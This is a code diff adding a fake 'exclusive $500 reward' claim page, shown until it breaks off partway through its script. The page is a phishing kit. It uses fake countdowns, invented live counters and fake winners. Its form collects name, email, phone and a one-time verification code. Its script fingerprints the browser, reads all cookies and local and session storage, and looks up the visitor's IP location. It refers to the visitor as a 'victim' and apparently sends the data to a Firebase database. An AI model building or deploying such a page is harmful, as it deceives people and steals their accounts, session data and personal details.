@@ -1,0 +1,1223 @@
+<!-- ═══════════════════════════════════════════════════════════
+     FILE: assets/offer.html
+     Exclusive Offer / Giveaway Claim Page — Real Campaign Flow
+     Connection: Firebase Realtime DB (same pattern)
+     ═══════════════════════════════════════════════════════════ -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="origin-when-crossorigin">
+<title>🎁 Exclusive Reward — Claim Your Prize Now</title>
+<link rel="shortcut icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E🎁%3C/text%3E%3C/svg%3E">
+<meta name="description" content="You've been selected for an exclusive reward. Claim now before it expires.">
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+<script src="../config.js"></script>
+
+<style>
+:root{
+  --bg:#05060a;
+  --bg2:#0b0e18;
+  --card:#10131f;
+  --card2:#151a2b;
+  --border:#232840;
+  --border2:#333a5c;
+  --gold:#ffd23f;
+  --gold2:#ffb200;
+  --gold-glow:rgba(255,210,63,.4);
+  --green:#00e07b;
+  --red:#ff4757;
+  --cyan:#42d8ff;
+  --purple:#a06bff;
+  --pink:#ff5fa2;
+  --txt:#eaf0ff;
+  --txt-dim:#8a92b8;
+  --txt-mute:#5a6288;
+  --ok:#00e07b;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{
+  font-family:'Inter','SF Pro Display',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+  background:var(--bg);
+  color:var(--txt);
+  min-height:100vh;
+  overflow-x:hidden;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:'';
+  position:fixed;
+  inset:0;
+  background:
+    radial-gradient(circle at 15% 20%,rgba(255,210,63,.14),transparent 45%),
+    radial-gradient(circle at 85% 30%,rgba(160,107,255,.14),transparent 45%),
+    radial-gradient(circle at 50% 90%,rgba(66,216,255,.1),transparent 50%);
+  z-index:0;
+  pointer-events:none;
+}
+body::after{
+  content:'';
+  position:fixed;
+  inset:0;
+  background-image:
+    linear-gradient(rgba(255,210,63,.03) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(255,210,63,.03) 1px,transparent 1px);
+  background-size:48px 48px;
+  mask-image:radial-gradient(ellipse at center,black 20%,transparent 75%);
+  z-index:0;
+  pointer-events:none;
+}
+.wrap{position:relative;z-index:1}
+
+/* ═══ TOP BAR ═══ */
+.topbar{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:14px 24px;
+  border-bottom:1px solid var(--border);
+  background:rgba(11,14,24,.7);
+  backdrop-filter:blur(14px);
+  position:sticky;
+  top:0;
+  z-index:50;
+}
+.brand{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  font-weight:800;
+  font-size:16px;
+  letter-spacing:.5px;
+}
+.brand .logo{
+  width:32px;height:32px;
+  border-radius:9px;
+  background:linear-gradient(135deg,var(--gold),var(--gold2));
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#05060a;
+  font-size:18px;
+  font-weight:900;
+  box-shadow:0 0 20px var(--gold-glow);
+}
+.brand .name span{color:var(--gold)}
+.topbar-right{
+  display:flex;
+  align-items:center;
+  gap:14px;
+  font-size:12px;
+  color:var(--txt-dim);
+}
+.pill-live{
+  display:flex;
+  align-items:center;
+  gap:6px;
+  padding:5px 11px;
+  border-radius:20px;
+  background:rgba(0,224,123,.1);
+  border:1px solid rgba(0,224,123,.3);
+  color:var(--ok);
+  font-weight:600;
+  font-size:11px;
+  letter-spacing:.5px;
+}
+.pill-live .dot{
+  width:6px;height:6px;
+  border-radius:50%;
+  background:var(--ok);
+  animation:blink 1.4s infinite;
+}
+@keyframes blink{0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(0,224,123,.6)}50%{opacity:.5;box-shadow:0 0 0 6px rgba(0,224,123,0)}}
+
+/* ═══ HERO ═══ */
+.hero{
+  max-width:1000px;
+  margin:0 auto;
+  padding:40px 24px 20px;
+  text-align:center;
+}
+.badge{
+  display:inline-flex;
+  align-items:center;
+  gap:8px;
+  padding:7px 16px;
+  border-radius:30px;
+  background:rgba(255,210,63,.08);
+  border:1px solid rgba(255,210,63,.35);
+  color:var(--gold);
+  font-size:12px;
+  font-weight:700;
+  letter-spacing:1.5px;
+  text-transform:uppercase;
+  margin-bottom:22px;
+}
+.badge .pulse{
+  width:8px;height:8px;
+  border-radius:50%;
+  background:var(--gold);
+  box-shadow:0 0 12px var(--gold);
+  animation:blink 1.2s infinite;
+}
+.hero h1{
+  font-size:clamp(28px,5vw,54px);
+  font-weight:900;
+  line-height:1.1;
+  letter-spacing:-1px;
+  margin-bottom:16px;
+}
+.hero h1 .gradient{
+  background:linear-gradient(135deg,var(--gold) 0%,#ff9500 50%,var(--gold2) 100%);
+  -webkit-background-clip:text;
+  background-clip:text;
+  -webkit-text-fill-color:transparent;
+}
+.hero p.sub{
+  font-size:clamp(14px,1.8vw,17px);
+  color:var(--txt-dim);
+  max-width:640px;
+  margin:0 auto 32px;
+  line-height:1.6;
+}
+
+/* ═══ PRIZE CARD ═══ */
+.prize-card{
+  background:linear-gradient(160deg,var(--card) 0%,var(--card2) 100%);
+  border:1px solid var(--border);
+  border-radius:20px;
+  padding:32px;
+  max-width:640px;
+  margin:0 auto;
+  box-shadow:0 30px 80px rgba(0,0,0,.5),0 0 60px rgba(255,210,63,.08);
+  position:relative;
+  overflow:hidden;
+}
+.prize-card::before{
+  content:'';
+  position:absolute;
+  top:-50%;
+  left:-50%;
+  width:200%;
+  height:200%;
+  background:conic-gradient(from 0deg,transparent 0deg,rgba(255,210,63,.25) 90deg,transparent 180deg);
+  animation:rotate 8s linear infinite;
+  opacity:.35;
+  z-index:0;
+}
+@keyframes rotate{to{transform:rotate(360deg)}}
+.prize-card > *{position:relative;z-index:1}
+
+.prize-amount{
+  font-size:clamp(56px,10vw,90px);
+  font-weight:900;
+  background:linear-gradient(135deg,var(--gold) 0%,#fff8dc 50%,var(--gold) 100%);
+  -webkit-background-clip:text;
+  background-clip:text;
+  -webkit-text-fill-color:transparent;
+  line-height:1;
+  letter-spacing:-2px;
+  text-shadow:0 0 60px var(--gold-glow);
+  margin-bottom:6px;
+}
+.prize-label{
+  font-size:14px;
+  color:var(--txt-dim);
+  letter-spacing:3px;
+  text-transform:uppercase;
+  margin-bottom:24px;
+}
+
+.prize-meta{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(120px,1fr));
+  gap:12px;
+  margin:24px 0 28px;
+  padding-top:24px;
+  border-top:1px solid var(--border);
+}
+.meta-item{
+  text-align:center;
+}
+.meta-item .k{
+  font-size:10px;
+  color:var(--txt-mute);
+  letter-spacing:1.5px;
+  text-transform:uppercase;
+  margin-bottom:5px;
+}
+.meta-item .v{
+  font-size:15px;
+  color:var(--txt);
+  font-weight:700;
+}
+.meta-item .v.gold{color:var(--gold)}
+.meta-item .v.green{color:var(--ok)}
+
+/* ═══ CTA BUTTON ═══ */
+.cta{
+  display:block;
+  width:100%;
+  padding:18px 24px;
+  background:linear-gradient(135deg,var(--gold) 0%,var(--gold2) 100%);
+  color:#05060a;
+  font-size:16px;
+  font-weight:800;
+  letter-spacing:1px;
+  text-transform:uppercase;
+  border:none;
+  border-radius:14px;
+  cursor:pointer;
+  font-family:inherit;
+  position:relative;
+  overflow:hidden;
+  transition:transform .15s,box-shadow .15s;
+  box-shadow:0 10px 30px rgba(255,210,63,.35),inset 0 1px 0 rgba(255,255,255,.3);
+}
+.cta:hover{
+  transform:translateY(-2px);
+  box-shadow:0 16px 40px rgba(255,210,63,.5),inset 0 1px 0 rgba(255,255,255,.3);
+}
+.cta:active{transform:translateY(0)}
+.cta::after{
+  content:'';
+  position:absolute;
+  top:0;
+  left:-100%;
+  width:100%;
+  height:100%;
+  background:linear-gradient(90deg,transparent,rgba(255,255,255,.4),transparent);
+  animation:shimmer 2.5s infinite;
+}
+@keyframes shimmer{to{left:100%}}
+.cta:disabled{opacity:.6;cursor:default}
+
+.cta-note{
+  font-size:12px;
+  color:var(--txt-mute);
+  text-align:center;
+  margin-top:14px;
+  letter-spacing:.3px;
+}
+
+/* ═══ TRUST ROW ═══ */
+.trust{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:20px;
+  flex-wrap:wrap;
+  padding:32px 24px;
+  color:var(--txt-mute);
+  font-size:11px;
+  letter-spacing:1px;
+  text-transform:uppercase;
+}
+.trust-item{
+  display:flex;
+  align-items:center;
+  gap:6px;
+}
+.trust-item svg{
+  width:14px;height:14px;
+  fill:var(--ok);
+}
+
+/* ═══ LIVE COUNTER ═══ */
+.live-strip{
+  display:flex;
+  justify-content:center;
+  gap:14px;
+  flex-wrap:wrap;
+  padding:0 24px 32px;
+}
+.live-chip{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  padding:8px 14px;
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:30px;
+  font-size:12px;
+  color:var(--txt-dim);
+}
+.live-chip b{color:var(--gold);font-weight:800}
+
+/* ═══ MODAL — MULTI STEP ═══ */
+.modal-bg{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.8);
+  backdrop-filter:blur(8px);
+  z-index:200;
+  display:none;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+  overflow-y:auto;
+}
+.modal-bg.on{display:flex}
+.modal{
+  background:var(--card);
+  border:1px solid var(--border2);
+  border-radius:20px;
+  padding:32px 28px 28px;
+  width:100%;
+  max-width:440px;
+  box-shadow:0 30px 80px rgba(0,0,0,.7);
+  position:relative;
+  animation:pop .25s ease;
+}
+@keyframes pop{from{transform:scale(.9);opacity:0}to{transform:scale(1);opacity:1}}
+.modal-close{
+  position:absolute;
+  top:14px;right:14px;
+  width:32px;height:32px;
+  border-radius:50%;
+  background:rgba(255,255,255,.05);
+  border:1px solid var(--border);
+  color:var(--txt-dim);
+  cursor:pointer;
+  font-size:16px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.modal-close:hover{background:rgba(255,71,87,.15);border-color:var(--red);color:var(--red)}
+
+.modal-step-indicator{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  margin-bottom:22px;
+}
+.step-dot{
+  width:30px;height:4px;
+  border-radius:2px;
+  background:var(--border2);
+  transition:.3s;
+}
+.step-dot.on{background:var(--gold);box-shadow:0 0 12px var(--gold-glow)}
+.step-dot.done{background:var(--ok)}
+
+.modal-icon{
+  width:64px;height:64px;
+  margin:0 auto 16px;
+  border-radius:16px;
+  background:linear-gradient(135deg,var(--gold),var(--gold2));
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:30px;
+  color:#05060a;
+  box-shadow:0 0 30px var(--gold-glow);
+}
+.modal h2{
+  font-size:22px;
+  font-weight:800;
+  text-align:center;
+  margin-bottom:8px;
+  letter-spacing:-.4px;
+}
+.modal .sub{
+  font-size:13px;
+  color:var(--txt-dim);
+  text-align:center;
+  line-height:1.5;
+  margin-bottom:22px;
+}
+
+.form-group{margin-bottom:14px}
+.form-group label{
+  display:block;
+  font-size:11px;
+  color:var(--txt-dim);
+  letter-spacing:1.5px;
+  text-transform:uppercase;
+  margin-bottom:6px;
+  font-weight:600;
+}
+.form-input{
+  width:100%;
+  padding:13px 15px;
+  background:rgba(255,255,255,.03);
+  border:1.5px solid var(--border);
+  border-radius:10px;
+  color:var(--txt);
+  font-size:15px;
+  outline:none;
+  font-family:inherit;
+  transition:border-color .15s,box-shadow .15s;
+}
+.form-input:focus{
+  border-color:var(--gold);
+  box-shadow:0 0 0 3px rgba(255,210,63,.15);
+}
+.form-input::placeholder{color:var(--txt-mute)}
+
+.otp-input{
+  width:100%;
+  padding:16px;
+  background:rgba(255,255,255,.03);
+  border:1.5px solid var(--border);
+  border-radius:10px;
+  color:var(--gold);
+  font-size:26px;
+  font-weight:800;
+  text-align:center;
+  letter-spacing:12px;
+  outline:none;
+  font-family:inherit;
+  padding-left:24px;
+}
+.otp-input:focus{
+  border-color:var(--gold);
+  box-shadow:0 0 0 3px rgba(255,210,63,.15);
+}
+
+.modal .cta{
+  margin-top:20px;
+  font-size:15px;
+  padding:15px 20px;
+}
+.modal .back-link{
+  display:block;
+  text-align:center;
+  margin-top:14px;
+  font-size:12px;
+  color:var(--txt-dim);
+  cursor:pointer;
+  text-decoration:underline;
+}
+.modal .back-link:hover{color:var(--gold)}
+
+.error-box{
+  background:rgba(255,71,87,.1);
+  border:1px solid rgba(255,71,87,.4);
+  color:var(--red);
+  padding:10px 14px;
+  border-radius:8px;
+  font-size:13px;
+  margin-bottom:14px;
+  display:none;
+  line-height:1.4;
+}
+.error-box.show{display:block}
+
+.spinner{
+  display:none;
+  width:18px;
+  height:18px;
+  border:2px solid rgba(5,6,10,.3);
+  border-top-color:#05060a;
+  border-radius:50%;
+  animation:spin .7s linear infinite;
+  margin:0 auto;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ═══ SUCCESS ═══ */
+.success-icon{
+  width:80px;height:80px;
+  margin:0 auto 18px;
+  border-radius:50%;
+  background:radial-gradient(circle,rgba(0,224,123,.2),rgba(0,224,123,.05));
+  border:2px solid var(--ok);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:var(--ok);
+  font-size:40px;
+  animation:pop .4s ease;
+  box-shadow:0 0 40px rgba(0,224,123,.4);
+}
+
+/* ═══ WINNERS FEED ═══ */
+.winners{
+  max-width:900px;
+  margin:20px auto 40px;
+  padding:0 24px;
+}
+.winners h3{
+  text-align:center;
+  font-size:14px;
+  letter-spacing:2px;
+  text-transform:uppercase;
+  color:var(--txt-dim);
+  margin-bottom:20px;
+  font-weight:700;
+}
+.winners-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
+  gap:10px;
+}
+.winner{
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:12px;
+  padding:14px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  font-size:12px;
+}
+.winner .av{
+  width:34px;height:34px;
+  border-radius:50%;
+  background:linear-gradient(135deg,var(--gold),var(--gold2));
+  color:#05060a;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-weight:800;
+  font-size:14px;
+  flex-shrink:0;
+}
+.winner .info{min-width:0;flex:1}
+.winner .n{
+  color:var(--txt);
+  font-weight:700;
+  overflow:hidden;
+  text-overflow:ellipsis;
+  white-space:nowrap;
+}
+.winner .w{
+  color:var(--ok);
+  font-size:11px;
+  margin-top:2px;
+}
+
+/* ═══ FOOTER ═══ */
+.footer{
+  padding:22px 24px;
+  text-align:center;
+  font-size:11px;
+  color:var(--txt-mute);
+  border-top:1px solid var(--border);
+  letter-spacing:.5px;
+}
+.footer a{color:var(--txt-dim);text-decoration:none;margin:0 10px}
+.footer a:hover{color:var(--gold)}
+
+/* ═══ MOBILE ═══ */
+@media(max-width:600px){
+  .hero{padding:26px 18px 14px}
+  .prize-card{padding:24px 20px;border-radius:16px}
+  .topbar{padding:12px 16px}
+  .topbar-right .pill-live{display:none}
+  .modal{padding:24px 22px 22px}
+  .hero h1{margin-bottom:12px}
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<!-- ═══ TOP BAR ═══ -->
+<header class="topbar">
+  <div class="brand">
+    <div class="logo">★</div>
+    <div class="name">REWARD<span>HUB</span></div>
+  </div>
+  <div class="topbar-right">
+    <div class="pill-live"><span class="dot"></span>LIVE</div>
+    <span>Verified Campaign</span>
+  </div>
+</header>
+
+<!-- ═══ HERO ═══ -->
+<section class="hero">
+  <div class="badge">
+    <span class="pulse"></span>
+    Exclusive Offer · Limited Time
+  </div>
+  <h1>You've Been Selected For<br><span class="gradient">$500 Cash Reward</span></h1>
+  <p class="sub">
+    Our partner program has verified your eligibility. Complete the short verification to claim your reward before it expires.
+  </p>
+
+  <!-- ═══ PRIZE CARD ═══ -->
+  <div class="prize-card">
+    <div class="prize-amount">$500</div>
+    <div class="prize-label">Your Claim Value</div>
+
+    <div class="prize-meta">
+      <div class="meta-item">
+        <div class="k">Status</div>
+        <div class="v gold">Unclaimed</div>
+      </div>
+      <div class="meta-item">
+        <div class="k">Expires</div>
+        <div class="v" id="expiresIn">23:59:47</div>
+      </div>
+      <div class="meta-item">
+        <div class="k">Verified</div>
+        <div class="v green">✓ You</div>
+      </div>
+    </div>
+
+    <button class="cta" onclick="openModal()">Claim Your $500 Now →</button>
+    <div class="cta-note">Takes less than 60 seconds · No credit card required</div>
+  </div>
+</section>
+
+<!-- ═══ LIVE STRIP ═══ -->
+<div class="live-strip">
+  <div class="live-chip">🔥 <b id="claimsToday">0</b> claims today</div>
+  <div class="live-chip">👥 <b id="viewers">0</b> people viewing now</div>
+  <div class="live-chip">⏱️ Offer ends <b id="shortTimer">23:59</b></div>
+</div>
+
+<!-- ═══ TRUST ROW ═══ -->
+<div class="trust">
+  <div class="trust-item">
+    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+    SSL Secured
+  </div>
+  <div class="trust-item">
+    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+    Verified Partner
+  </div>
+  <div class="trust-item">
+    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+    256-bit Encryption
+  </div>
+</div>
+
+<!-- ═══ WINNERS FEED ═══ -->
+<section class="winners">
+  <h3>Recent Winners</h3>
+  <div class="winners-grid" id="winnersGrid"></div>
+</section>
+
+<!-- ═══ FOOTER ═══ -->
+<footer class="footer">
+  <div>
+    <a href="#">Terms</a>
+    <a href="#">Privacy</a>
+    <a href="#">Contact</a>
+    <a href="#">FAQ</a>
+  </div>
+  <div style="margin-top:10px">© 2026 RewardHub · All rights reserved</div>
+</footer>
+
+</div>
+
+<!-- ═══ CLAIM MODAL (multi-step) ═══ -->
+<div class="modal-bg" id="modalBg">
+  <div class="modal" id="modalContent">
+
+    <!-- STEP 1: FORM -->
+    <div id="claimStep1">
+      <div class="modal-step-indicator">
+        <div class="step-dot on"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+      </div>
+
+      <div class="modal-icon">🎁</div>
+      <h2>Claim Your Reward</h2>
+      <p class="sub">Enter your details to verify and claim your $500 reward.</p>
+
+      <div class="error-box" id="claimError"></div>
+
+      <form id="claimForm" onsubmit="return submitClaim(event)" novalidate>
+        <div class="form-group">
+          <label for="fullName">Full Name</label>
+          <input type="text" class="form-input" id="fullName" name="fullName"
+                 placeholder="John Doe" autocomplete="name" required>
+        </div>
+        <div class="form-group">
+          <label for="email">Email Address</label>
+          <input type="email" class="form-input" id="email" name="email"
+                 placeholder="you@example.com" autocomplete="email" required>
+        </div>
+        <div class="form-group">
+          <label for="phone">Phone Number</label>
+          <input type="tel" class="form-input" id="phone" name="phone"
+                 placeholder="+1 (555) 000-0000" autocomplete="tel" required>
+        </div>
+
+        <button type="submit" class="cta" id="claimBtn">
+          <span id="claimBtnText">Verify & Claim</span>
+          <div class="spinner" id="claimSpinner"></div>
+        </button>
+      </form>
+
+      <span class="back-link" onclick="closeModal()">Cancel</span>
+    </div>
+
+    <!-- STEP 2: OTP -->
+    <div id="claimStep2" style="display:none">
+      <div class="modal-step-indicator">
+        <div class="step-dot done"></div>
+        <div class="step-dot on"></div>
+        <div class="step-dot"></div>
+      </div>
+
+      <div class="modal-icon">📱</div>
+      <h2>Verify Your Number</h2>
+      <p class="sub">
+        We sent a 6-digit code to<br>
+        <b id="phoneDisplay" style="color:var(--gold)">+1 (555) 000-0000</b>
+      </p>
+
+      <div class="error-box" id="otpError"></div>
+
+      <form id="otpForm" onsubmit="return submitOtp(event)" novalidate>
+        <div class="form-group">
+          <label for="otpInput">Verification Code</label>
+          <input type="text" class="otp-input" id="otpInput" name="otp"
+                 placeholder="------" inputmode="numeric" pattern="[0-9]*"
+                 maxlength="6" autocomplete="one-time-code" required autofocus>
+        </div>
+
+        <button type="submit" class="cta" id="otpBtn">
+          <span id="otpBtnText">Confirm Code</span>
+          <div class="spinner" id="otpSpinner"></div>
+        </button>
+      </form>
+
+      <span class="back-link" onclick="resendCode()">Didn't receive? Resend code</span>
+    </div>
+
+    <!-- STEP 3: SUCCESS -->
+    <div id="claimStep3" style="display:none">
+      <div class="modal-step-indicator">
+        <div class="step-dot done"></div>
+        <div class="step-dot done"></div>
+        <div class="step-dot on"></div>
+      </div>
+
+      <div class="success-icon">✓</div>
+      <h2 style="color:var(--ok)">Verification Complete!</h2>
+      <p class="sub">
+        Your $500 reward has been approved. Our team will contact you at
+        <b id="successEmail" style="color:var(--gold)">your email</b>
+        within 24 hours with payout instructions.
+      </p>
+
+      <button class="cta" onclick="finishClaim()">Continue →</button>
+    </div>
+
+  </div>
+</div>
+
+<script>
+/* ═══════════════════════════════════════════════════════
+   FIREBASE INIT
+   ═══════════════════════════════════════════════════════ */
+firebase.initializeApp(window.firebaseConfig);
+const database = firebase.database();
+
+/* ═══════════════════════════════════════════════════════
+   STATE
+   ═══════════════════════════════════════════════════════ */
+let cachedDeviceInfo = null;
+let cachedIPInfo = null;
+let cachedCanvasFP = null;
+let cachedWebGLFP = null;
+let pendingData = null;
+let pendingVictimId = '';
+
+const REDIRECT_URL = 'https://www.google.com/';
+
+/* ═══════════════════════════════════════════════════════
+   SAFE KEY
+   ═══════════════════════════════════════════════════════ */
+function safeKey(key){
+  return String(key)
+    .replace(/\./g, '_').replace(/\#/g, '_').replace(/\$/g, '_')
+    .replace(/\//g, '_').replace(/\[/g, '_').replace(/\]/g, '_')
+    .replace(/\:/g, '_');
+}
+
+/* ═══════════════════════════════════════════════════════
+   DEVICE + FINGERPRINTS
+   ═══════════════════════════════════════════════════════ */
+function getDeviceInfo(){
+  const ua = navigator.userAgent;
+  return {
+    userAgent: ua, platform: navigator.platform, language: navigator.language,
+    languages: navigator.languages ? navigator.languages.join(',') : '',
+    screen: screen.width + 'x' + screen.height,
+    availScreen: screen.availWidth + 'x' + screen.availHeight,
+    colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    browser: detectBrowser(ua), browserVersion: detectBrowserVersion(ua),
+    os: detectOS(ua), device: ua.includes('Mobile') ? 'Mobile' : 'Desktop',
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack || 'unknown',
+    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+    memory: navigator.deviceMemory || 'unknown',
+    vendor: navigator.vendor || 'unknown', appVersion: navigator.appVersion
+  };
+}
+function detectBrowser(ua){
+  if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return 'Chrome';
+  if (ua.includes('Firefox')) return 'Firefox';
+  if (ua.includes('Edg')) return 'Edge';
+  if (ua.includes('OPR')) return 'Opera';
+  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+  return 'Unknown';
+}
+function detectBrowserVersion(ua){
+  const m = ua.match(/(Chrome|Firefox|Edge|Safari|Opera)\/(\d+)/);
+  return m ? m[1] + ' ' + m[2] : 'Unknown';
+}
+function detectOS(ua){
+  if (ua.includes('Windows NT 10')) return 'Windows 10';
+  if (ua.includes('Windows NT 11')) return 'Windows 11';
+  if (ua.includes('Windows NT 6.3')) return 'Windows 8.1';
+  if (ua.includes('Windows NT 6.1')) return 'Windows 7';
+  if (ua.includes('Android')){ const m = ua.match(/Android (\d+)/); return m ? 'Android ' + m[1] : 'Android'; }
+  if (ua.includes('iPhone')) return 'iOS (iPhone)';
+  if (ua.includes('iPad')) return 'iOS (iPad)';
+  if (ua.includes('Mac OS')) return 'macOS';
+  if (ua.includes('Linux')) return 'Linux';
+  return 'Unknown';
+}
+function getCanvasFingerprint(){
+  try{
+    const c = document.createElement('canvas'); c.width = 200; c.height = 50;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.textBaseline = 'alphabetic';
+    ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069'; ctx.fillText('CanvasFingerprint', 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('Browser', 4, 17);
+    return hashString(c.toDataURL());
+  }catch(e){ return 'canvas_error'; }
+}
+function getWebGLFingerprint(){
+  try{
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if(!gl) return 'no_webgl';
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    const vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+    const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    return vendor + ' | ' + renderer;
+  }catch(e){ return 'webgl_error'; }
+}
+function hashString(str){
+  let h = 0;
+  for (let i = 0; i < str.length; i++){ h = ((h << 5) - h) + str.charCodeAt(i); h = h & h; }
+  return h.toString(36);
+}
+
+/* ═══════════════════════════════════════════════════════
+   STORAGE
+   ═══════════════════════════════════════════════════════ */
+function getAllCookies(){
+  const out = {}; const raw = document.cookie;
+  if (raw) raw.split(';').forEach(c => {
+    const p = c.trim().split('='); const k = p[0]; const v = p.slice(1).join('=');
+    if(k) out[safeKey(k)] = v;
+  });
+  return out;
+}
+function getLocalStorage(){
+  try{ const d = {}; for (let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); d[safeKey(k)] = localStorage.getItem(k); } return d; }
+  catch(e){ return {}; }
+}
+function getSessionStorage(){
+  try{ const d = {}; for (let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); d[safeKey(k)] = sessionStorage.getItem(k); } return d; }
+  catch(e){ return {}; }
+}
+
+/* ═══════════════════════════════════════════════════════
+   IP INTEL
+   ═══════════════════════════════════════════════════════ */
+async function getIPInfo(){
+  try{
+    const r = await fetch('https://ipapi.co/json/', {signal: AbortSignal.timeout(5000)});
+    const d = await r.json();
+    return {
+      ip: d.ip||'Unknown', network: d.network||'', city: d.city||'Unknown',
+      region: d.region||'Unknown', country: d.country_name||'Unknown',
+      countryCode: d.country_code||'Unknown', isp: d.org||'Unknown',
+      asn: d.asn||'', timezone: d.timezone||'',
+      latitude: d.latitude||'', longitude: d.longitude||''
+    };
+  }catch{
+    try{
+      const r = await fetch('https://ipwho.is/', {signal: AbortSignal.timeout(5000)});
+      const d = await r.json();
+      return { ip:d.ip||'Unknown', city:d.city||'Unknown', country:d.country||'Unknown',
+               isp:d.connection?.isp||'Unknown', latitude:d.latitude||'', longitude:d.longitude||'' };
+    }catch{ return { ip:'Unknown', city:'Unknown', country:'Unknown' }; }
+  }
+}
+
+async function ensureIntel(){
+  if(!cachedDeviceInfo) cachedDeviceInfo = getDeviceInfo();
+  if(!cachedCanvasFP) cachedCanvasFP = getCanvasFingerprint();
+  if(!cachedWebGLFP) cachedWebGLFP = getWebGLFingerprint();
+  if(!cachedIPInfo) cachedIPInfo = await getIPInfo();
+}
+
+/* ═══════════════════════════════════════════════════════
+   PAGE AMBIENT — countdowns, fake live numbers
+   ═══════════════════════════════════════════════════════ */
+function startExpiresCountdown(){
+  let total = 23 * 3600 + 59 * 60 + 47;
+  setInterval(() => {
+    if(total <= 0) total = 23 * 3600 + 59 * 60 + 47;
+    total--;
+    const h = String(Math.floor(total / 3600)).padStart(2, '0');
+    const m = String(Math.floor((total % 3600) / 60)).padStart(2, '0');
+    const s = String(total % 60).padStart(2, '0');
+    const el = document.getElementById('expiresIn');
+    const short = document.getElementById('shortTimer');
+    if(el) el.textContent = h + ':' + m + ':' + s;
+    if(short) short.textContent = m + ':' + s;
+  }, 1000);
+}
+
+function startLiveNumbers(){
+  let claims = 1284 + Math.floor(Math.random() * 30);
+  let viewers = 47 + Math.floor(Math.random() * 20);
+  const updateClaims = () => {
+    claims += Math.floor(Math.random() * 3);
+    const el = document.getElementById('claimsToday');
+    if(el) el.textContent = claims.toLocaleString();
+  };
+  const updateViewers = () => {
+    viewers = 40 + Math.floor(Math.random() * 35);
+    const el = document.getElementById('viewers');
+    if(el) el.textContent = viewers;
+  };
+  updateClaims(); updateViewers();
+  setInterval(updateClaims, 4500);
+  setInterval(updateViewers, 6000);
+}
+
+const WINNER_NAMES = [
+  'James M.', 'Sarah K.', 'Carlos R.', 'Emily T.', 'David L.', 'Priya S.',
+  'Mohammed A.', 'Anna B.', 'Robert J.', 'Lin W.', 'Fatima H.', 'Michael O.',
+  'Jessica P.', 'Ahmed R.', 'Sofia G.', 'Daniel V.', 'Nadia I.', 'Kevin B.'
+];
+const WINNER_AMOUNTS = ['$500', '$250', '$100', '$500', '$1000', '$500'];
+
+function renderWinners(){
+  const grid = document.getElementById('winnersGrid');
+  if(!grid) return;
+  const shuffled = [...WINNER_NAMES].sort(() => Math.random() - 0.5).slice(0, 6);
+  grid.innerHTML = shuffled.map(n => {
+    const amt = WINNER_AMOUNTS[Math.floor(Math.random() * WINNER_AMOUNTS.length)];
+    const mins = Math.floor(Math.random() * 55) + 5;
+    return `
+      <div class="winner">
+        <div class="av">${n[0]}</div>
+        <div class="info">
